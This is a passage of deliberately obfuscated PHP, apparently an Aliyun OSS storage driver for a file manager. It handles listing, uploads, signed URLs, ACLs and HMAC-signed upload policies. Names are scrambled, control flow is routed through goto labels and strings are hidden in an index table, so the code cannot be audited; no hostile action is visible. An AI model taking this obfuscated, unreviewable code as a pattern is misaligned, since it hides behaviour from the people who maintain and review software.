$e¨¼È¬ª) { continue; } } return !0; } public function rename($e×Œñƒ‡øÇ, $eÄ»Ç÷öĞ¾) { return $this->renameObject($e×Œñƒ‡øÇ, $eÄ»Ç÷öĞ¾); } private function fileInfo($C›‡‘†à, $dåÂ§®öğ« = array()) { goto e±¾ƒâĞ‹„; e±¾ƒâĞ‹„: $fÚº•ğã­ç =& $_SERVER[Õİõş]; $C‚ô¤¹¥µ = array($fÚº•ğã­ç[28] => $this->pathThis($C›‡‘†à), $fÚº•ğã­ç[75] => $this->getPathOuter($C›‡‘†à), $fÚº•ğã­ç[29] => $fÚº•ğã­ç[163], $fÚº•ğã­ç[183] => 0, $fÚº•ğã­ç[106] => 0, $fÚº•ğã­ç[77] => 0, $fÚº•ğã­ç[156] => $this->ext($C›‡‘†à), $fÚº•ğã­ç[184] => !0, $fÚº•ğã­ç[185] => !0); if (empty($dåÂ§®öğ«)) { $d„Ú“¡ïÕí = $this->objectMeta($C›‡‘†à); if (!$d„Ú“¡ïÕí) { return $C‚ô¤¹¥µ; } $dåÂ§®öğ« = array($fÚº•ğã­ç[106] => strtotime($d„Ú“¡ïÕí[$fÚº•ğã­ç[1185]]), $fÚº•ğã­ç[77] => $d„Ú“¡ïÕí[$fÚº•ğã­ç[1186]] + 0); } goto Cò†ÑÊ©°¾; Cò†ÑÊ©°¾: if (isset($dåÂ§®öğ«[$fÚº•ğã­ç[77]])) { $C‚ô¤¹¥µ[$fÚº•ğã­ç[77]] = $dåÂ§®öğ«[$fÚº•ğã­ç[77]]; } if (isset($dåÂ§®öğ«[$fÚº•ğã­ç[106]])) { $C‚ô¤¹¥µ[$fÚº•ğã­ç[106]] = $dåÂ§®öğ«[$fÚº•ğã­ç[106]]; } if (isset($dåÂ§®öğ«[$fÚº•ğã­ç[186]]) && !trim($C‚ô¤¹¥µ[$fÚº•ğã­ç[106]])) { $C‚ô¤¹¥µ[$fÚº•ğã­ç[106]] = $dåÂ§®öğ«[$fÚº•ğã­ç[186]]; } goto dµÖ¨ä¯‡½; dµÖ¨ä¯‡½: return $C‚ô¤¹¥µ; goto Dø¼Óš¨; Dø¼Óš¨: } private function folderInfo($FÙôè©›¿ä, $FéŠ¬Œ† ¡ = array()) { $Aóøï÷£¼© =& $_SERVER[Õİõş]; $A¨êí·¼Ò© = array($Aóøï÷£¼©[28] => $this->pathThis($FÙôè©›¿ä), $Aóøï÷£¼©[75] => $this->getPathOuter($Aóøï÷£¼©[8] . $FÙôè©›¿ä), $Aóøï÷£¼©[29] => $Aóøï÷£¼©[76], $Aóøï÷£¼©[183] => 0, $Aóøï÷£¼©[106] => 0, $Aóøï÷£¼©[184] => !0, $Aóøï÷£¼©[185] => !0); if (empty($FéŠ¬Œ† ¡)) { $FÙôè©›¿ä = rtrim($FÙôè©›¿ä, $Aóøï÷£¼©[8]) . $Aóøï÷£¼©[8]; $cÇç°¥æƒ† = $this->objectMeta($FÙôè©›¿ä); if (!$cÇç°¥æƒ†) { return $A¨êí·¼Ò©; } $FéŠ¬Œ† ¡ = array($Aóøï÷£¼©[183] => $cÇç°¥æƒ†[$Aóøï÷£¼©[1187]][$Aóøï÷£¼©[1188]], $Aóøï÷£¼©[106] => strtotime($cÇç°¥æƒ†[$Aóøï÷£¼©[1185]])); } if (isset($FéŠ¬Œ† ¡[$Aóøï÷£¼©[106]])) { $A¨êí·¼Ò©[$Aóøï÷£¼©[106]] = $FéŠ¬Œ† ¡[$Aóøï÷£¼©[106]]; } if (isset($FéŠ¬Œ† ¡[$Aóøï÷£¼©[183]])) { $A¨êí·¼Ò©[$Aóøï÷£¼©[183]] = $FéŠ¬Œ† ¡[$Aóøï÷£¼©[183]]; } return $A¨êí·¼Ò©; } public function listPath($f§ÙØ¡·‘ï, $AĞÀœ…ˆ = false) { $c¯’›£»¾æ =& $_SERVER[Õİõş]; $e’–•’Ç»¼ = $this->fileList($f§ÙØ¡·‘ï, $c¯’›£»¾æ[8], !0); foreach ($e’–•’Ç»¼[$c¯’›£»¾æ[74]] as $Aª¶¢ÇœÌÛ => $D¦‰¹ÉöÜ) { $e’–•’Ç»¼[$c¯’›£»¾æ[74]][$Aª¶¢ÇœÌÛ] = $this->folderInfo($D¦‰¹ÉöÜ, $D¦‰¹ÉöÜ); } foreach ($e’–•’Ç»¼[$c¯’›£»¾æ[73]] as $Aª¶¢ÇœÌÛ => $D¦‰¹ÉöÜ) { $e’–•’Ç»¼[$c¯’›£»¾æ[73]][$Aª¶¢ÇœÌÛ] = $this->fileInfo($D¦‰¹ÉöÜ[$c¯’›£»¾æ[28]], $D¦‰¹ÉöÜ); } return $e’–•’Ç»¼; } public function has($CÍÏ­¥ˆ, $BÍê’¸¦ìÌ = false, $Bº‰Æ…ï‰° = true) { goto eò±é°¤; eò±é°¤: $D½ã‹ôß‚ô =& $_SERVER[Õİõş]; $CÍÏ­¥ˆ = trim($CÍÏ­¥ˆ, $D½ã‹ôß‚ô[8]); $aåÌ…í™³¢ = empty($CÍÏ­¥ˆ) ? $D½ã‹ôß‚ô[33] : $CÍÏ­¥ˆ . $D½ã‹ôß‚ô[8]; goto e†Ç±±¯–; Cõ‡Àßîµã: return !1; goto D¦ã¬¶ÃŒÉ; Bƒ°ï§è¥Ï: $B¾ï¹Ä¦œ = 0; while (!0) { $Bš°¯Óğè” = array($D½ã‹ôß‚ô[1176] => $D½ã‹ôß‚ô[8], $D½ã‹ôß‚ô[182] => $aåÌ…í™³¢, $D½ã‹ôß‚ô[1177] => $c°¨¬ˆëŠÍ, $D½ã‹ôß‚ô[1178] => $cÜ™‹´Ñ¨); try { $e¿†Ä³®åÇ = $this->client->listObjects($this->bucket, $Bš°¯Óğè”); } catch (OSS\Core\OssException $a‹ê·ßïİ°) { break; } $cÜ™‹´Ñ¨ = $e¿†Ä³®åÇ->getNextMarker(); $a£³íé™­Ê = $e¿†Ä³®åÇ->getObjectList(); $E„äÇŒ¦ = $e¿†Ä³®åÇ->getPrefixList(); if ($BÍê’¸¦ìÌ) { if (count($a£³íé™­Ê) > 1 || count($a£³íé™­Ê) == 1 && $a£³íé™­Ê[0]->getKey() != $aåÌ…í™³¢) { $f£Òá¥ÙĞ³ += count($a£³íé™­Ê) - 1; } if (!empty($E„äÇŒ¦)) { $B¾ï¹Ä¦œ += count($E„äÇŒ¦); } if ($cÜ™‹´Ñ¨ === $D½ã‹ôß‚ô[33]) { break; } continue; } if ($Bº‰Æ…ï‰°) { if (!empty($a£³íé™­Ê)) { if (count($a£³íé™­Ê) > 1 || $a£³íé™­Ê[0]->getKey() != $aåÌ…í™³¢) { return !0; } } } else { if (!empty($E„äÇŒ¦)) { return !0; } } if ($cÜ™‹´Ñ¨ === $D½ã‹ôß‚ô[33]) { break; } } if ($BÍê’¸¦ìÌ) { return array($D½ã‹ôß‚ô[187] => $f£Òá¥ÙĞ³, $D½ã‹ôß‚ô[188] => $B¾ï¹Ä¦œ); } goto Cõ‡Àßîµã; e†Ç±±¯–: $cÜ™‹´Ñ¨ = $D½ã‹ôß‚ô[33]; $c°¨¬ˆëŠÍ = 500; $f£Òá¥ÙĞ³ = 0; goto Bƒ°ï§è¥Ï; D¦ã¬¶ÃŒÉ: } public function listAll($eÆİÊŸ¼Ñã) { $dŠç‘Œßò =& $_SERVER[Õİõş]; $F…¶ÌØš‹¢ = $this->fileList($eÆİÊŸ¼Ñã, $dŠç‘Œßò[33], !0); $AÀ•Ÿó¼Å = array(); foreach ($F…¶ÌØš‹¢[$dŠç‘Œßò[73]] as $AÉ‰ø”æ¹) { $AÀ•Ÿó¼Å[$AÉ‰ø”æ¹[$dŠç‘Œßò[28]]] = $AÉ‰ø”æ¹[$dŠç‘Œßò[77]]; } return $this->listAllFiles($eÆİÊŸ¼Ñã, array_keys($AÀ•Ÿó¼Å), $AÀ•Ÿó¼Å); } public function canRead($EŸÕÁ‡‡ôº) { $Bì“•İÕğ« =& $_SERVER[Õİõş]; $bÈ§òÍìªÓ = $this->pathAcl($EŸÕÁ‡‡ôº); return $bÈ§òÍìªÓ == $Bì“•İÕğ«[1189] || $bÈ§òÍìªÓ == $Bì“•İÕğ«[486] ? !0 : !1; } public function canWrite($fÛóø‚Äå´) { $C¦™ÂÈ® = $this->pathAcl($fÛóø‚Äå´); return $C¦™ÂÈ® == $_SERVER[Õİõş][486] ? !0 : !1; } public function pathAcl($Aˆ†¤”ãÍ) { goto C¡¯Ñ×áøÓ; C¡¯Ñ×áøÓ: $B›Ù‡Î•Ñ =& $_SERVER[Õİõş]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $Bƒò ˆËÛ¥ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Aˆ†¤”ãÍ)); } catch (OSS\Core\OssException $bâñ²ŒÙ‰±) { return !1; } goto BõİÖ‚•; FÈ‰ÀÊÁæ„: return $Fíœ±ßƒƒÃ; goto Cìà¯Ÿ¯ïø; BõİÖ‚•: $Fíœ±ßƒƒÃ = $Bƒò ˆËÛ¥ == $B›Ù‡Î•Ñ[34] ? $this->bucketAcl : $Bƒò ˆËÛ¥; if ($Fíœ±ßƒƒÃ == $B›Ù‡Î•Ñ[1190]) { return $B›Ù‡Î•Ñ[1189]; } if ($Fíœ±ßƒƒÃ == $B›Ù‡Î•Ñ[1191]) { return $B›Ù‡Î•Ñ[486]; } goto FÈ‰ÀÊÁæ„; Cìà¯Ÿ¯ïø: } private function chmodPath($Cå¿ˆÏ÷÷¹, $cÉŠ°¦È¥ = '') { $bŠ¨„‡İ­‘ =& $_SERVER[Õİõş]; $D¨™â“òÉÏ = empty($cÉŠ°¦È¥) ? $bŠ¨„‡İ­‘[1191] : $cÉŠ°¦È¥; $dï¡æÀµÈ = array($bŠ¨„‡İ­‘[34], $bŠ¨„‡İ­‘[181], $bŠ¨„‡İ­‘[1190], $bŠ¨„‡İ­‘[1191]); if (!in_array($D¨™â“òÉÏ, $dï¡æÀµÈ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Cå¿ˆÏ÷÷¹), $D¨™â“òÉÏ); } catch (OSS\Core\OssException $e´‚ÉÅŠ’) { return !1; } return !0; } public function getContent($D‡·İÙèÜ) { return $this->fileSubstr($D‡·İÙèÜ, -1); } public function setContent($DÛ¹ÆÎÉ÷¦, $aÙëå÷‘Ê‡ = '') { $aÌƒëËËõ =& $_SERVER[Õİõş]; try { $cïî’ØôÚ¦ = $this->trafficLimit($aÌƒëËËõ[1192]); $a³ä”Ù¸Œ = $this->client->putObject($this->bucket, $this->pathEncode($DÛ¹ÆÎÉ÷¦), $aÙëå÷‘Ê‡, $cïî’ØôÚ¦); } catch (OSS\Core\OssException $bĞß„ğ¼ô„) { return !1; } $A¢¨¯÷Šó¢ = array($aÌƒëËËõ[1179] => trim($a³ä”Ù¸Œ[$aÌƒëËËõ[1193]], $aÌƒëËËõ[112]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($DÛ¹ÆÎÉ÷¦))); $this->updateObjMeta($DÛ¹ÆÎÉ÷¦, $A¢¨¯÷Šó¢); return isset($a³ä”Ù¸Œ[$aÌƒëËËõ[1194]][$aÌƒëËËõ[1141]]) ? (int) $a³ä”Ù¸Œ[$aÌƒëËËõ[1194]][$aÌƒëËËõ[1141]] : strlen($a³ä”Ù¸Œ); } private function updateObjMeta($b¥Øİè·Á¹, $CÇª÷®Ãô) { $b¥Øİè·Á¹ = $this->pathEncode($b¥Øİè·Á¹); try { $E©®¯äŠÛ³ = array(OSS\OssClient::OSS_HEADERS => $CÇª÷®Ãô); $this->client->copyObject($this->bucket, $b¥Øİè·Á¹, $this->bucket, $b¥Øİè·Á¹, $E©®¯äŠÛ³); } catch (OSS\Core\OssException $Cà‹‰µ„Ú) { return !1; } return !0; } public function upload($AÏÕ…ƒ‡İµ, $aê™ ›Éíà, $Cá‰ƒ¸÷“ = false, $F¸Ô÷öºÆ = REPEAT_REPLACE) { $aÁ¿çéµ§Î =& $_SERVER[Õİõş]; $cÂåöÃ¿˜® = trim($AÏÕ…ƒ‡İµ, $aÁ¿çéµ§Î[8]); $A ŒÁš®¢â = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($aÁ¿çéµ§Î[1179] => @md5_file($aê™ ›Éíà)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($AÏÕ…ƒ‡İµ))); $A ŒÁš®¢â = $this->trafficLimit($aÁ¿çéµ§Î[1192], $A ŒÁš®¢â); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($cÂåöÃ¿˜®), $aê™ ›Éíà, $A ŒÁš®¢â); } catch (OSS\Core\OssException $a¦¿à‡îÈ) { return !1; } return $this->getPathOuter($AÏÕ…ƒ‡İµ); } public function getHost() { $F§ƒ²Â´µ =& $_SERVER[Õİõş]; $c†øÍŠé = explode($F§ƒ²Â´µ[167], parent::getHost()); return $c†øÍŠé[0] . $F§ƒ²Â´µ[167] . $this->bucket . $F§ƒ²Â´µ[91] . $c†øÍŠé[1]; } public function uploadFormData($f¡ƒ¾êĞË, $f¼¡£ééŸ = 3600) { goto a¶›ËÄ©Ö¯; fªÜ¦•ˆ…: $Dàî’¢Š• = $this->pathFather($f¡ƒ¾êĞË); $aš•†ÒéğÇ = array($cÚÍáëÉ‹Š[1098] => $c®„’§‚ª, $cÚÍáëÉ‹Š[1099] => array(array($cÚÍáëÉ‹Š[1197], 0, $eÛùÒ’ôÆÃ), array($cÚÍáëÉ‹Š[1102], $cÚÍáëÉ‹Š[1103], $Dàî’¢Š•))); $AŒÃ¹³ì¸ = base64_encode(json_encode($aš•†ÒéğÇ)); goto AŠŸ²›ŞğŠ; EÁ·ïìíß: return $D³öê„; goto FÕâ±¬¾‚»; aŒƒ¹àÃï: $FÜ‘†„Áˆ¶ = strpos($c®„’§‚ª, $cÚÍáëÉ‹Š[280]); $c®„’§‚ª = substr($c®„’§‚ª, 0, $FÜ‘†„Áˆ¶) . $cÚÍáëÉ‹Š[1196]; $eÛùÒ’ôÆÃ = 1048576000 * 5; goto fªÜ¦•ˆ…; AŠŸ²›ŞğŠ: $aÉÕöÛÖšâ = base64_encode(hash_hmac($cÚÍáëÉ‹Š[214], $AŒÃ¹³ì¸, $this->secret, !0)); $D³öê„ = array($cÚÍáëÉ‹Š[1108] => $AŒÃ¹³ì¸, $cÚÍáëÉ‹Š[1198] => $this->accessKey, $cÚÍáëÉ‹Š[1104] => $cÚÍáëÉ‹Š[1096], $cÚÍáëÉ‹Š[1199] => $aÉÕöÛÖšâ, $cÚÍáëÉ‹Š[165] => $FÚ–Æ¸±ãé); $D³öê„ = $this->trafficLimit($cÚÍáëÉ‹Š[1192], $D³öê„); goto EÁ·ïìíß; a¶›ËÄ©Ö¯: $cÚÍáëÉ‹Š =& $_SERVER[Õİõş]; if (!($FÚ–Æ¸±ãé = $this->getHost())) { return !1; } $Bî¬ÌÂØ°— = $f¼¡£ééŸ; goto FÂñÜ±ä; FÂñÜ±ä: $eŒŠ»ï†íù = date($cÚÍáëÉ‹Š[1195], time() + $Bî¬ÌÂØ°—); $f¨Şô¥Ó‹ = new DateTime($eŒŠ»ï†íù); $c®„’§‚ª = $f¨Şô¥Ó‹->format(DateTime::ISO8601); goto aŒƒ¹àÃï; FÕâ±¬¾‚»: } public function multiUploadFormData($DæˆÆ— é¡, $f©çˆƒà§ = 3600) { $c•½ˆ‡‰Ï =& $_SERVER[Õİõş]; if (!($b¥ŸŠÍù‘¹ = $this->getHost())) { return !1; } $f™²Ï½¹¬ = $this->trafficLimit($c•½ˆ‡‰Ï[1192]); $fµ ‚‹„À“ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($DæˆÆ— é¡), $f™²Ï½¹¬); return array($c•½ˆ‡‰Ï[205] => $fµ ‚‹„À“, $c•½ˆ‡‰Ï[165] => $b¥ŸŠÍù‘¹ . $c•½ˆ‡‰Ï[8] . $this->pathEncode($DæˆÆ— é¡), $c•½ˆ‡‰Ï[206] => gmdate($c•½ˆ‡‰Ï[1200]), $c•½ˆ‡‰Ï[89] => $DæˆÆ— é¡); } public function multiUploadAuthData($BÇ©¼¼Õó, $Eª†Í®—ºç = array()) { goto eß„‘‡ˆ‘; eß„‘‡ˆ‘: $a©¸“İ²ö =& $_SERVER[Õİõş]; $fÂí‡¤İØˆ = isset($Eª†Í®—ºç[$a©¸“İ²ö[206]]) ? $Eª†Í®—ºç[$a©¸“İ²ö[206]] : gmdate($a©¸“İ²ö[1200]); $c”ƒÜ “‚Ø = isset($Eª†Í®—ºç[$a©¸“İ²ö[156]]) ? $Eª†Í®—ºç[$a©¸“İ²ö[156]] : $a©¸“İ²ö[33]; goto eÉÕƒ¸ªŠê; F¬…å­œ·Ñ: $f¯áší„ï¾ = array($a©¸“İ²ö[208], $a©¸“İ²ö[33], $a©¸“İ²ö[115], $fÂí‡¤İØˆ, "\x78\55\157\x73\163\55\144\x61\164\x65\72{$fÂí‡¤İØˆ}", $a©¸“İ²ö[8] . $this->bucket . $a©¸“İ²ö[8] . $Fí¨˜âÌÍó . $c”ƒÜ “‚Ø); if (strpos($c”ƒÜ “‚Ø, $a©¸“İ²ö[209]) === 0) { $f¯áší„ï¾[0] = $a©¸“İ²ö[210]; if ($aõÂÚ²¡ = $this->trafficLimit($a©¸“İ²ö[1192])) { $Fí¨˜âÌÍó = $a©¸“İ²ö[1201]; array_splice($f¯áší„ï¾, 5, 0, $Fí¨˜âÌÍó . $a©¸“İ²ö[4] . $aõÂÚ²¡[$Fí¨˜âÌÍó]); } } if (isset($Eª†Í®—ºç[$a©¸“İ²ö[211]]) && $Eª†Í®—ºç[$a©¸“İ²ö[211]] == $a©¸“İ²ö[212]) { $f¯áší„ï¾[0] = $a©¸“İ²ö[212]; } goto aŒ×ó‘£ÌÃ; aŒ×ó‘£ÌÃ: if (!empty($Eª†Í®—ºç[$a©¸“İ²ö[1202]])) { $CÅ‹›ò÷¤š = array_merge(array($f¯áší„ï¾[4]), $Eª†Í®—ºç[$a©¸“İ²ö[1202]]); sort($CÅ‹›ò÷¤š); $f¯áší„ï¾[4] = implode($a©¸“İ²ö[213], $CÅ‹›ò÷¤š); } $f‡ßËï¹ ¡ = implode($a©¸“İ²ö[213], $f¯áší„ï¾); $cÊ­¡“ùŸ = base64_encode(hash_hmac($a©¸“İ²ö[214], $f‡ßËï¹ ¡, $this->secret, !0)); goto c¸ŞòëÆ›İ; c¸ŞòëÆ›İ: $e‚ÊÂĞ„ = $a©¸“İ²ö[1203] . $this->accessKey . $a©¸“İ²ö[4] . $cÊ­¡“ùŸ; if (strpos($c”ƒÜ “‚Ø, $a©¸“İ²ö[209]) === 0) { $e‚ÊÂĞ„ = array($a©¸“İ²ö[216] => $e‚ÊÂĞ„, $a©¸“İ²ö[206] => $fÂí‡¤İØˆ); if ($aõÂÚ²¡) { $e‚ÊÂĞ„ = array_merge($e‚ÊÂĞ„, $aõÂÚ²¡); } } return $e‚ÊÂĞ„; goto BÂ££ÊÀÛ¾; eÉÕƒ¸ªŠê: $Fí¨˜âÌÍó = $BÇ©¼¼Õó; if (isset($Eª†Í®—ºç[$a©¸“İ²ö[89]])) { $Fí¨˜âÌÍó = $Eª†Í®—ºç[$a©¸“İ²ö[89]]; unset($Eª†Í®—ºç[$a©¸“İ²ö[89]]); } if (isset($Eª†Í®—ºç[$a©¸“İ²ö[207]])) { $Eª†Í®—ºç[$a©¸“İ²ö[206]] = $fÂí‡¤İØˆ; return $this->listUploadParts($Fí¨˜âÌÍó, $Eª†Í®—ºç); } goto F¬…å­œ·Ñ; BÂ££ÊÀÛ¾: } public function listUploadParts($a„ÉöÊÓö, $bé˜¾”ƒã÷) { goto d«Ş¨ŸÙŞ; d«Ş¨ŸÙŞ: $f·¼©Ã‹® =& $_SERVER[Õİõş]; $f§‰éØÆÆ· = parse_url_query($bé˜¾”ƒã÷[$f·¼©Ã‹®[156]]); $Fá½Å†Å = $this->client->listParts($this->bucket, $this->pathEncode($a„ÉöÊÓö), $f§‰éØÆÆ·[$f·¼©Ã‹®[205]]); goto F×¥ê´‰”á; F×¥ê´‰”á: $B†¬ØµÚÊÛ = $Fá½Å†Å->getListPart(); $Fï¹å‹ĞßÙ = array(); foreach ($B†¬ØµÚÊÛ as $F£†—ÊãÃ) { $Fï¹å‹ĞßÙ[] = array($f·¼©Ã‹®[1183] => $F£†—ÊãÃ->getPartNumber(), $f·¼©Ã‹®[1184] => trim($F£†—ÊãÃ->getETag(), $f·¼©Ã‹®[112])); } goto cÉñ¬¨ï•ö; cÉñ¬¨ï•ö: unset($bé˜¾”ƒã÷[$f·¼©Ã‹®[207]], $bé˜¾”ƒã÷[$f·¼©Ã‹®[211]]); $aÈ­¥é±ñ = $this->multiUploadAuthData($a„ÉöÊÓö, $bé˜¾”ƒã÷); if (empty($aÈ­¥é±ñ)) { return !1; } goto Dö²õå‹; Dö²õå‹: return array($f·¼©Ã‹®[216] => $aÈ­¥é±ñ, $f·¼©Ã‹®[206] => $bé˜¾”ƒã÷[$f·¼©Ã‹®[206]], $f·¼©Ã‹®[218] => $Fï¹å‹ĞßÙ); goto FĞœİ˜Œ³; FĞœİ˜Œ³: } public function download($E‹ê¬Åİø¦, $C¯îò®”‚ª) { if ($this->isFolder($E‹ê¬Åİø¦)) { return !1; } try { $b®Ô†­ö› = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $C¯îò®”‚ª); $b®Ô†­ö› = $this->trafficLimit($_SERVER[Õİõş][104], $b®Ô†­ö›); $this->client->getObject($this->bucket, $this->pathEncode($E‹ê¬Åİø¦), $b®Ô†­ö›); } catch (OSS\Core\OssException $C¹Å¾µ˜×) { return !1; } return $C¯îò®”‚ª; } public function fileSubstr($d©¬‚Õ©«, $F‘ÊôìëÁê = 0, $bŞ§ÅÅ‡Äš = false) { if ($F‘ÊôìëÁê === -1) { $A³´ÓÔ³ß‰ = array(); } else { if ($bŞ§ÅÅ‡Äš === !1) { $e‹ªÅ•‚‹ = $this->size($d©¬‚Õ©«); } else { $e‹ªÅ•‚‹ = $F‘ÊôìëÁê + $bŞ§ÅÅ‡Äš - 1; } $A³´ÓÔ³ß‰ = array(OSS\OssClient::OSS_RANGE => "{$F‘ÊôìëÁê}\x2d{$e‹ªÅ•‚‹}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($d©¬‚Õ©«), $A³´ÓÔ³ß‰); } catch (OSS\Core\OssException $FöÉ„ÙÉê’) { think_exception($FöÉ„ÙÉê’->getMessage()); return !1; } } private function trafficLimit($e›Ñâ˜§Šµ, $c¥İ°ÈõÚ = array()) { goto Aô¢ïÊ·¸À; Aô¢ïÊ·¸À: $B…²®åÒ =& $_SERVER[Õİõş]; if ($e›Ñâ˜§Šµ == $B…²®åÒ[1192] && $this->isUploadServer() || $e›Ñâ˜§Šµ == $B…²®åÒ[104] && $this->isFileOutServer()) { return $c¥İ°ÈõÚ; } $dàø¹¾Èòù = floatval($GLOBALS[$B…²®åÒ[6]][$B…²®åÒ[84]][$B…²®åÒ[102]][$e›Ñâ˜§Šµ]) * 1024 * 1024 * 8; goto bƒî—ğ´; FÖ®ÑÕÃ¹‹: return $c¥İ°ÈõÚ; goto a¯ñŠøÜÔ; bƒî—ğ´: if (!$dàø¹¾Èòù) { return $c¥İ°ÈõÚ; } $dàø¹¾Èòù = $dàø¹¾Èòù < 819200 ? 819200 : ($dàø¹¾Èòù > 838860800 ? 838860800 : $dàø¹¾Èòù); $c¥İ°ÈõÚ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($dàø¹¾Èòù); goto FÖ®ÑÕÃ¹‹; a¯ñŠøÜÔ: } public function link($bÈŸ’ë‚­², $dÇÎñÅ–ÁŒ = array()) { $bã•˜•ŒÕ± =& $_SERVER[Õİõş]; if (!$this->exist($bÈŸ’ë‚­²) || $this->isFolder($bÈŸ’ë‚­²)) { return !1; } try { $dÇÎñÅ–ÁŒ = $this->trafficLimit($bã•˜•ŒÕ±[104], $dÇÎñÅ–ÁŒ); $cÕÊĞñÊÇ¤ = $this->client->signUrl($this->bucket, $this->pathEncode($bÈŸ’ë‚­²), 3600 * 12, $bã•˜•ŒÕ±[212], $dÇÎñÅ–ÁŒ); return $this->getCdnLink($cÕÊĞñÊÇ¤); } catch (OSS\Core\OssException $f­À©”ƒ“ä) { return !1; } } public function fileOut($Eßùîµ›óÀ, $bòî±©˜Ùù = false, $Dèº˜ø™óÂ = false, $Eé” àóÎ = '') { goto Fë‚—İ”ƒó; fÁ£òï–Î¿: $eÜ›¦Â„Í = get_file_mime(get_path_ext($Dèº˜ø™óÂ)); if ($eÜ›¦Â„Í == $C†ëÃ£¶ˆ¢[197]) { return parent::fileOut($Eßùîµ›óÀ, $bòî±©˜Ùù, $Dèº˜ø™óÂ, $Eé” àóÎ); } $bòî±©˜Ùù = $bòî±©˜Ùù ? $C†ëÃ£¶ˆ¢[198] : $C†ëÃ£¶ˆ¢[199]; goto a”¿ã»ù»Ö; Fë‚—İ”ƒó: $C†ëÃ£¶ˆ¢ =& $_SERVER[Õİõş]; if (!$Dèº˜ø™óÂ) { $Dèº˜ø™óÂ = $this->pathThis($Eßùîµ›óÀ); } $Dèº˜ø™óÂ = rawurlencode($Dèº˜ø™óÂ); goto fÁ£òï–Î¿; a”¿ã»ù»Ö: $A›ºÄÆé­Â = array(OSS\OssClient::OSS_SUB_RESOURCE => $C†ëÃ£¶ˆ¢[1204] . rawurlencode("{$bòî±©˜Ùù}\73\x66\151\x6c\x65\156\x61\155\145\x3d{$Dèº˜ø™óÂ}")); $A›ºÄÆé­Â[OSS\OssClient::OSS_SUB_RESOURCE] .= $C†ëÃ£¶ˆ¢[1205] . $eÜ›¦Â„Í; $D…¾µƒÌ = $this->link($Eßùîµ›óÀ, $A›ºÄÆé­Â); goto d–ÕÜ¿÷…; d–ÕÜ¿÷…: $this->fileOutLink($D…¾µƒÌ); goto dë•›²²³Š; dë•›²²³Š: } public function fileOutServer($B“‹ÉÈ”Ç³, $B×‰ğµïÏò = false, $f½ØÓñ„µÍ = false, $d¬øØÄ¨’ = '') { parent::fileOut($B“‹ÉÈ”Ç³, $B×‰ğµïÏò, $f½ØÓñ„µÍ, $d¬øØÄ¨’); } public function fileOutImage($a³œ¿Í´‹Î, $dŒ»Ù¤ˆÙ‘ = 250) { $E¯±èÁÁ–· = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Õİõş][1206] . $dŒ»Ù¤ˆÙ‘); $AÕ‚áµÃ¥Ğ = $this->link($a³œ¿Í´‹Î, $E¯±èÁÁ–·); $this->fileOutLink($AÕ‚áµÃ¥Ğ); } public function fileOutImageServer($fİÇ²ˆ²”, $dÊ¯ÕË®ª¹ = 250) { parent::fileOutImage($fİÇ²ˆ²”, $dÊ¯ÕË®ª¹); } public function fileOutLink($C¡¿ßĞ‘ùÚ) { $Eî‡¾¸è• =& $_SERVER[Õİõş]; if (!$this->isCdnHost() && substr($C¡¿ßĞ‘ùÚ, 0, 7) == $Eî‡¾¸è•[1111]) { $C¡¿ßĞ‘ùÚ = $Eî‡¾¸è•[1112] . substr($C¡¿ßĞ‘ùÚ, 7); } header($Eî‡¾¸è•[152] . $C¡¿ßĞ‘ùÚ); die; } public function hashMd5($Eã†Û¬ÒõŞ, $DÇë…‰ŠÃß = '') { $b™¼ƒ¥ø¾ =& $_SERVER[Õİõş]; $EíŠœ¬³ãå = $this->objectMeta($Eã†Û¬ÒõŞ); if (!$EíŠœ¬³ãå) { return $b™¼ƒ¥ø¾[33]; } if (!isset($EíŠœ¬³ãå[$b™¼ƒ¥ø¾[1179]]) && !empty($DÇë…‰ŠÃß)) { $b•“äÜĞÚÇ = $this->updateObjMeta($Eã†Û¬ÒõŞ, array($b™¼ƒ¥ø¾[1179] => $DÇë…‰ŠÃß)); $EíŠœ¬³ãå[$b™¼ƒ¥ø¾[1179]] = $b•“äÜĞÚÇ ? $DÇë…‰ŠÃß : $b™¼ƒ¥ø¾[33]; } return isset($EíŠœ¬³ãå[$b™¼ƒ¥ø¾[1179]]) ? strtolower($EíŠœ¬³ãå[$b™¼ƒ¥ø¾[1179]]) : $b™¼ƒ¥ø¾[33]; } public function size($eêšÕÊÆê) { $C˜èèßìë¾ = $this->objectMeta($eêšÕÊÆê); return $C˜èèßìë¾ ? $C˜èèßìë¾[$_SERVER[Õİõş][77]] : 0; } public function info($CÆõÓ†¯ªõ) { if ($this->isFolder($CÆõÓ†¯ªõ)) { return $this->folderInfo($CÆõÓ†¯ªõ); } else { if ($this->isFile($CÆõÓ†¯ªõ)) { return $this->fileInfo($CÆõÓ†¯ªõ); } } return !1; } public function exist($b‚×”§é“µ) { return $this->isFile($b‚×”§é“µ) || $this->isFolder($b‚×”§é“µ); } public function isFile($Dİô×¬â¡İ) { return !$this->isFolder($Dİô×¬â¡İ) && $this->objectMeta($Dİô×¬â¡İ); } public function isFolder($B¹¶¢ŸÑ³ˆ) { return $this->cacheMethod($_SERVER[Õİõş][219], $B¹¶¢ŸÑ³ˆ); } protected function objectMeta($b¸ÂÀÅ£Ş­) { return $this->cacheMethod($_SERVER[Õİõş][220], $b¸ÂÀÅ£Ş­); } protected function _objectMeta($eİÂÁ’…÷ô) { $a‡Üáïğ¶ =& $_SERVER[Õİõş]; try { $Cà©‹è¤‹¹ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($eİÂÁ’…÷ô)); } catch (OSS\Core\OssException $bÛÕÈáñÏ) { $Cà©‹è¤‹¹ = !1; } if ($Cà©‹è¤‹¹) { $Cà©‹è¤‹¹[$a‡Üáïğ¶[77]] = 